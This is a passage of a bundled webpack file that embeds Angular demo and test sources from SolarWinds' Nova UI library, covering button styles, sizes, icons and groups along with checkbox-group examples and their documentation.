nui-button id="basic-button" type="button">Click me!</button>\n    </div>\n\n    <div class="row"><h3>Primary, Action, and Destructive buttons</h3></div>\n    <div class="row">\n        <button\n            nui-button\n            id="primary-button"\n            type="button"\n            displayStyle="primary"\n        >\n            Click me!\n        </button>\n        <button\n            nui-button\n            id="action-button"\n            type="button"\n            displayStyle="action"\n        >\n            Click me!\n        </button>\n        <button nui-button type="button" displayStyle="destructive">\n            Click me!\n        </button>\n    </div>\n\n    <div class="row"><h3>Sized buttons</h3></div>\n    \x3c!-- nui-button is vulnerable to bootstrap \'row\' class which sets \'display: flex\'. Consider removing the inline style\n         from the following div either when the issue is resolved or shadow dom is applied to the component--\x3e\n    <div class="row" style="display: block">\n        <button nui-button type="button" size="compact">Compact</button>\n        <button nui-button type="button">Default</button>\n        <button nui-button type="button" size="large">Large</button>\n    </div>\n\n    <div class="row"><h3>Buttons with icons</h3></div>\n    <div class="row" style="display: block">\n        <button nui-button type="button" icon="add">Click me!</button>\n        <button nui-button type="button" icon="reload" [iconRight]="true">\n            Click me!\n        </button>\n        <button nui-button type="button" icon="power-on" iconColor="orange">\n            Click me!\n        </button>\n        <button nui-button type="button" icon="star-full"></button>\n        <div class="w-100 mt-2"></div>\n        <button\n            nui-button\n            id="primary-button-with-icon"\n            type="button"\n            displayStyle="primary"\n            icon="add"\n        >\n            Click me!\n        </button>\n        <button\n            nui-button\n            id="action-button-with-icon"\n            type="button"\n            displayStyle="action"\n            icon="status_warning"\n        >\n            Click me!\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="destructive"\n            icon="printer"\n        >\n            Click me!\n        </button>\n        <div class="w-100 mt-2"></div>\n        <button\n            nui-button\n            type="button"\n            size="large"\n            displayStyle="primary"\n            icon="add"\n            [iconRight]="true"\n            [disabled]="true"\n            i18n\n        >\n            Disabled Primary\n        </button>\n        <button\n            nui-button\n            type="button"\n            size="large"\n            displayStyle="action"\n            icon="status_warning"\n            [iconRight]="true"\n            [disabled]="true"\n            i18n\n        >\n            Disabled Action\n        </button>\n        <button\n            nui-button\n            type="button"\n            size="large"\n            displayStyle="destructive"\n            icon="printer"\n            [iconRight]="true"\n            [disabled]="true"\n            i18n\n        >\n            Disabled Destructive\n        </button>\n    </div>\n\n    <div class="row" style="display: block">\n        <h3>Sized buttons with icons</h3>\n        <button nui-button type="button" size="compact" icon="add">\n            Compact + icon\n        </button>\n        <button nui-button type="button" icon="add">Default + icon</button>\n        <button nui-button type="button" size="large" icon="add">\n            Large + icon\n        </button>\n    </div>\n\n    <div class="row"><h3>Buttons with repeat</h3></div>\n    <div class="row">\n        <button\n            nui-button\n            type="button"\n            [isRepeat]="true"\n            displayStyle="action"\n            icon="caret-up"\n        ></button>\n        <button\n            nui-button\n            type="button"\n            [isRepeat]="true"\n            displayStyle="action"\n            icon="caret-down"\n        ></button>\n    </div>\n\n    <div class="row"><h3>Button with busy</h3></div>\n    <div class="row">\n        <button nui-button type="button" [isBusy]="true">Click me!</button>\n    </div>\n\n    <div class="row"><h3>Buttons in a group</h3></div>\n    <div class="row">\n        <div class="btn-group">\n            <button nui-button type="button">First</button>\n            <button nui-button type="button">Second</button>\n            <button nui-button type="button">Third</button>\n            <button nui-button type="button">Fourth</button>\n            <button nui-button type="button">Fifth</button>\n        </div>\n    </div>\n</div>\n'},3311:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-visual",\n    templateUrl: "./button-visual-test.component.html",\n})\nexport class ButtonVisualTestComponent {\n    public busy: boolean;\n}\n'},79473:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" icon="power-on" iconColor="orange" i18n>\n    Click me!\n</button>\n'},98429:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-with-icon-custom-color-example",\n    templateUrl: "./button-with-icon-custom-color.example.component.html",\n})\nexport class ButtonWithIconCustomColorExampleComponent {}\n'},27569:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" icon="star-full"></button>\n'},48733:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-with-icon-only-example",\n    templateUrl: "./button-with-icon-only.example.component.html",\n})\nexport class ButtonWithIconOnlyExampleComponent {}\n'},93123:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" icon="reload" [iconRight]="true" i18n>\n    Click me!\n</button>\n'},90843:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-with-icon-right-example",\n    templateUrl: "./button-with-icon-right.example.component.html",\n})\nexport class ButtonWithIconRightExampleComponent {}\n'},82497:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" icon="add" i18n>Click me!</button>\n'},1133:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-button-with-icon-example",\n    templateUrl: "./button-with-icon.example.component.html",\n})\nexport class ButtonWithIconExampleComponent {}\n'},81625:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ButtonBasicExampleComponent,\n    ButtonBusyExampleComponent,\n    ButtonDisplayStyleActionExampleComponent,\n    ButtonDisplayStyleDestructiveExampleComponent,\n    ButtonDisplayStylePrimaryExampleComponent,\n    ButtonDocsComponent,\n    ButtonGroupExampleComponent,\n    ButtonRepeatableExampleComponent,\n    ButtonSizeExampleComponent,\n    ButtonTestComponent,\n    ButtonVisualTestComponent,\n    ButtonWithIconCustomColorExampleComponent,\n    ButtonWithIconExampleComponent,\n    ButtonWithIconOnlyExampleComponent,\n    ButtonWithIconRightExampleComponent,\n    ButtonWithLongTextExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ButtonDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "button-test",\n        component: ButtonTestComponent,\n    },\n    {\n        path: "button-visual-test",\n        component: ButtonVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        FormsModule,\n        ReactiveFormsModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        ButtonDocsComponent,\n        ButtonDisplayStyleActionExampleComponent,\n        ButtonDisplayStyleDestructiveExampleComponent,\n        ButtonDisplayStylePrimaryExampleComponent,\n        ButtonGroupExampleComponent,\n        ButtonRepeatableExampleComponent,\n        ButtonBasicExampleComponent,\n        ButtonBusyExampleComponent,\n        ButtonSizeExampleComponent,\n        ButtonTestComponent,\n        ButtonVisualTestComponent,\n        ButtonWithIconExampleComponent,\n        ButtonWithIconRightExampleComponent,\n        ButtonWithIconCustomColorExampleComponent,\n        ButtonWithIconOnlyExampleComponent,\n        ButtonWithLongTextExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("button"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ButtonModule {}\n'},50875:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./button-docs/button-docs.example.component";\nexport * from "./button-test/button-test.component";\nexport * from "./button-basic/button-basic.example.component";\nexport * from "./button-busy/button-busy.example.component";\nexport * from "./button-display-style-primary/button-display-style-primary.example.component";\nexport * from "./button-display-style-action/button-display-style-action.example.component";\nexport * from "./button-display-style-destructive/button-display-style-destructive.example.component";\nexport * from "./button-repeatable/button-repeatable.example.component";\nexport * from "./button-size/button-size.example.component";\nexport * from "./button-with-icon/button-with-icon.example.component";\nexport * from "./button-with-icon-only/button-with-icon-only.example.component";\nexport * from "./button-with-icon-right/button-with-icon-right.example.component";\nexport * from "./button-with-icon-custom-color/button-with-icon-custom-color.example.component";\nexport * from "./button-group/button-group.example.component";\nexport * from "./button-visual-test/button-visual-test.component";\nexport * from "./button-long-text/button-with-long-text-example.component";\n'},49856:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox-group\n    id="nui-demo-checkbox-group-basic"\n    name="vegetable"\n    [values]="selectedVegetables"\n    (valuesChange)="onValueChange($event)"\n>\n    <nui-checkbox\n        *ngFor="let vegetable of vegetables"\n        [value]="vegetable"\n        i18n-hint\n        hint="This is some help text"\n        [checked]="isChecked(vegetable)"\n    >\n        {{ vegetable }}\n    </nui-checkbox>\n</nui-checkbox-group>\n'},26048:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-checkbox-group-basic-example",\n    templateUrl: "./checkbox-group-basic.example.component.html",\n})\nexport class CheckboxGroupBasicExampleComponent {\n    public cabbage = $localize`Cabbage`;\n    public potato = $localize`Potato`;\n    public tomato = $localize`Tomato`;\n    public carrot = $localize`Carrot`;\n    public vegetables = [this.cabbage, this.potato, this.tomato, this.carrot];\n    public selectedVegetables = [this.potato, this.tomato];\n\n    constructor(private toastService: ToastService) {}\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n\n    public onValueChange(event: any): void {\n        this.toastService.success({\n            message: $localize`Selected checkboxes: ` + event,\n        });\n    }\n}\n'},23306:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiCheckboxModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    The <code>&lt;nui-checkbox-group&gt;</code> component is used for combining\n    <code>&lt;nui-checkbox&gt;</code> components into a group. Use the\n    <code>name</code> input to set the "name" attribute for the inner\n    <code>&lt;nui-checkbox&gt;</code> input elements. To get the values of the\n    <code>&lt;nui-checkbox&gt;</code> child components use the\n    <code>values</code> input which is an array of checked state values. To act\n    on checkbox value changes, bind to the <code>(valuesChange)</code> output.\n</p>\n<nui-example-wrapper\n    filenamePrefix="checkbox-group-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-checkbox-group-basic-example></nui-checkbox-group-basic-example>\n</nui-example-wrapper>\n\n<h2>Inline</h2>\n<p>\n    Use the <code>nui-checkbox-group-inline</code> class to display checkbox\n    group inline.\n</p>\n<nui-example-wrapper\n    filenamePrefix="checkbox-group-inline"\n    exampleTitle="Inline"\n>\n    <nui-checkbox-group-inline-example></nui-checkbox-group-inline-example>\n</nui-example-wrapper>\n\n<h2>Part of Form</h2>\n<p><code>&lt;nui-checkbox-group&gt;</code> can be used in reactive forms.</p>\n<nui-example-wrapper\n    filenamePrefix="checkbox-group-in-form"\n    exampleTitle="Part of Form"\n>\n    <nui-checkbox-group-in-form-example></nui-checkbox-group-in-form-example>\n</nui-example-wrapper>\n\n<h2>Justified</h2>\n<p>\n    To justify <code>&lt;nui-checkbox&gt;</code> to the width of\n    <code>&lt;nui-checkbox-group&gt;</code> (or simply parent element, in case\n    <code>&lt;nui-checkbox&gt;</code> is used not as a part of\n    <code>&lt;nui-checkbox-group&gt;</code>), add\n    <code>nui-checkbox--justified</code> class to the\n    <code>&lt;nui-checkbox&gt;</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="checkbox-group-justified"\n    exampleTitle="Justified"\n>\n    <nui-checkbox-group-justified-example></nui-checkbox-group-justified-example>\n</nui-example-wrapper>\n'},7510:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-group-docs-example",\n    templateUrl: "./checkbox-group-docs.example.component.html",\n})\nexport class CheckboxGroupExampleComponent {}\n'},4296:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="myForm" (submit)="onSubmit()">\n    <div class="form-group">\n        <nui-message\n            [allowDismiss]="true"\n            type="critical"\n            *ngIf="\n                !myForm.controls[\'checkboxGroup\'].valid &&\n                myForm.controls[\'checkboxGroup\'].touched\n            "\n        >\n            <b i18n>Select minimum 3 checkboxes!</b>\n        </nui-message>\n        <nui-checkbox-group\n            id="nui-demo-checkbox-group-in-form"\n            formControlName="checkboxGroup"\n            name="vegetable"\n            required\n        >\n            <nui-checkbox\n                *ngFor="let vegetable of vegetables"\n                [value]="vegetable"\n            >\n                {{ vegetable }}\n            </nui-checkbox>\n        </nui-checkbox-group>\n    </div>\n    <button\n        nui-button\n        type="submit"\n        [disabled]="myForm.disabled || myForm.controls[\'checkboxGroup\'].invalid"\n        i18n\n    >\n        Submit\n    </button>\n</form>\n'},96056:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-checkbox-group-in-form-example",\n    templateUrl: "./checkbox-group-in-form.example.component.html",\n})\nexport class CheckboxGroupInFormExampleComponent {\n    public cabbage = $localize`Cabbage`;\n    public potato = $localize`Potato`;\n    public tomato = $localize`Tomato`;\n    public carrot = $localize`Carrot`;\n    public vegetables = [this.cabbage, this.potato, this.tomato, this.carrot];\n    public selectedVegetables = [this.cabbage];\n    public myForm;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        private toastService: ToastService\n    ) {\n        this.myForm = this.formBuilder.group({\n            checkboxGroup: this.formBuilder.control(\n                [this.cabbage, this.potato],\n                [Validators.required, Validators.minLength(3)]\n            ),\n        });\n    }\n\n    public onSubmit(): void {\n        console.log(this.myForm);\n        this.toastService.success({ message: $localize`Your form is valid!` });\n    }\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n}\n'},65582:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox-group\n    id="nui-demo-checkbox-group-inline"\n    class="nui-checkbox-group-inline"\n    [values]="selectedVegetables"\n    name="vegetable"\n>\n    <nui-checkbox *ngFor="let vegetable of vegetables" [value]="vegetable">\n        {{ vegetable }}\n    </nui-checkbox>\n</nui-checkbox-group>\n'},61514:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-checkbox-group-inline-example",\n    templateUrl: "./checkbox-group-inline.example.component.html",\n})\nexport class CheckboxGroupInlineExampleComponent {\n    public cabbage = $localize`Cabbage`;\n    public potato = $localize`Potato`;\n    public tomato = $localize`Tomato`;\n    public carrot = $localize`Carrot`;\n    public vegetables = [this.cabbage, this.potato, this.tomato, this.carrot];\n    public selectedVegetables = [this.potato, this.tomato];\n\n    constructor() {}\n}\n'},19006:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-checkbox-group\n    id="nui-demo-checkbox-group-justified"\n    name="vegetable"\n    [values]="selectedVegetables"\n>\n    <nui-checkbox\n        *ngFor="let vegetable of vegetables"\n        [value]="vegetable"\n        i18n-hint\n        [hint]="\n            hints.indexOf(vegetable) >= 0\n                ? hints[hints.indexOf(vegetable)]\n                : null\n        "\n        [checked]="isChecked(vegetable)"\n        class="nui-checkbox--justified"\n    >\n        {{ vegetable }}\n    </nui-checkbox>\n</nui-checkbox-group>\n'},19034:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    